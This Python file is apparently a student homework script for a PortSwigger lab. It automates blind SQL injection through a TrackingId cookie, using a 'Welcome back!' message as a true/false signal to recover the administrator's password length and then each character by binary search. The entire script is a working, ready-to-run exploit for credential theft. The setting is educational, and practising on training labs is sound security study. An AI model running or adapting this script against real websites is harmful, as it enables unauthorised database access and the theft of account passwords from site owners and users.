# hw2.py -- written by Andrew Stevenson on 4/22/21 for CS595 at PSU
# Accepts a portswigger.com level url as a command line argument; prints out the administrator
# password using a binary search algorithm.

import urllib.parse
import sys
import requests
from bs4 import BeautifulSoup
import time
import string

# Parse the command line argument and set the global variables
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
url = f'https://{site}/'
valid_chars = string.ascii_lowercase + string.digits


def is_resultset_extant(query):
    """
    Exploit a SQL injection vulnerability in the target website to determine whether the provided SQL string returns
    at least one row by checking for the presence of a 'Welcome back!' message.
    :param query: (string) string containing the query to run on target server
    :return: (boolean) True if at least one row was returned; false otherwise.
    """
    mycookies = {'TrackingId': urllib.parse.quote_plus("x' " + query + '--')}
    resp = requests.get(url, cookies=mycookies)
    if resp.status_code is not 200:
        raise Exception(f"Error contacting remote server. HTTP {resp.status_code} response with message {resp.text}")
    soup = BeautifulSoup(resp.text, 'html.parser')
    return soup.find('div', text='Welcome back!')


def get_pwd_length():
    """
    Determine the length of the password for the administrator user account.
    :return: (int) Length of the password for the administrator user account.
    """
    num = 1
    while True:
        query = f"UNION ALL SELECT username FROM users WHERE username='administrator' AND length(password)={num}"
        if not is_resultset_extant(query):
            num = num + 1
        else:
            return num


def get_pwd_binary(length):
    """
    Determine the password for the administrator user account given its length.
    :param length: (int) the length of the password for the administrator user account.
    :return: (str) the password for the administrator user account.
    """
    pwd = ''
    for x in range(length):
        remaining = valid_chars
        while len(remaining) > 1:
            parts = partition_str(remaining)
            query = f"UNION SELECT username FROM users WHERE username='administrator' AND password SIMILAR TO '{pwd}[{parts[0]}]%'"
            remaining = parts[0] if is_resultset_extant(query) else parts[1]
        pwd += remaining
        print(pwd)
    return pwd


def partition_str(to_partition):
    """
    Split the provided string into two equally-long parts.
    :param to_partition: (str) the string to be split into two parts
    :return: (list) two strings of equal length (or within 1, if to_partition is odd)
    """
    l = len(to_partition)
    if l > 1:
        return [to_partition[:l // 2], to_partition[l // 2:]]
    else:
        raise Exception(f"Invalid parameter '{to_partition}' in partition_str().")


if __name__ == "__main__":
    try:
        t = time.perf_counter()
        l = get_pwd_length()
        p = get_pwd_binary(l)
        print(f'Done. Found {p}')
        print(f'Time elapsed is {time.perf_counter() - t}')
    except Exception as e:
        print(f'Error: {e.__str__()}')
